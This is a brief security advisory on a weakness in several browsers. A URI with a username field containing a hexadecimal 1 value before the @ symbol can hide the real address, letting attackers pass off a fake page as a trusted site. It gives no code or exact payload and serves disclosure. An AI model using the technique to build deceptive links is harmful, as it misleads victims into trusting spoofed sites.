A weakness has been reported in multiple browsers that may allow attackers to obfuscate the URI for a visited page. The problem is said to occur when a URI designed to pass access a specific location with a supplied username, contains a hexadecimal 1 value prior to the @ symbol.

An attacker could exploit this issue by supplying a malicious URI pointing to a page designed to mimic that of a trusted site, and tricking a victim who follows a link into believing they are actually at the trusted location.
